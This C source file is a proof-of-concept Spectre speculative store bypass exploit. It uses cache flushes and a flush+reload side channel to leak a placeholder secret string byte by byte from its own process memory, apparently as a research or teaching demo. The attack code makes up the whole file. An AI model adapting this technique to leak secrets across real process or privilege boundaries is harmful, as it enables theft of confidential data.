#define _GNU_SOURCE
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <x86intrin.h>

#include "../cache.h"

#define MAX_TRIES 10000

char **memory_slot_ptr[256] CACHE_LINE_ALIGNED;
char *memory_slot[256] CACHE_LINE_ALIGNED;

char *secret_key CACHE_LINE_ALIGNED = "The answer is 42";
char *public_key CACHE_LINE_ALIGNED = "################";

char probe[256 * CACHE_LINE_SIZE] CACHE_LINE_ALIGNED = {0};
volatile uint8_t tmp = 0;

inline static void victim(size_t idx) {
  char **memory_slot_slow_ptr = *memory_slot_ptr;
  *memory_slot_slow_ptr = public_key;
  tmp = probe[(*memory_slot)[idx] * CACHE_LINE_SIZE];
}

char spectre_ssb(size_t to_read) {
  size_t results[256] = {0};
  unsigned int junk = 0;

  for (int tries = 0; tries < MAX_TRIES; tries++) {

    *memory_slot_ptr = memory_slot;
    *memory_slot = secret_key;

    _mm_clflush(public_key);
    _mm_clflush(secret_key);
    _mm_clflush(memory_slot_ptr);
    for (int i = 0; i < 256; i++) {
      _mm_clflush(&probe[i * CACHE_LINE_SIZE]);
    }

    _mm_mfence();

    victim(to_read);

    measure_cache(probe, results);
    tmp ^= junk;

    int read = valid_read(results, 256);
    if (read != -1) {
      return (char)read;
    }
  }

  return 0;
}

int main(void) {
  pin_cpu0();
  /// Putting the probe not in a COW page causes the exploit to fail. It just
  /// makes it easier to read the public key and not perform the bypass
  for (int i = 0; i < sizeof(probe); i++) {
    probe[i] = 1;
  }

  int len = strlen(secret_key);
  for (int i = 0; i < len; i++) {
    printf("reading %d...", i);
    char value = spectre_ssb(i);
    printf("0x%02X='%c'\n", value, (value > 31 && value < 127 ? value : '?'));
  }
  printf("\n");
}
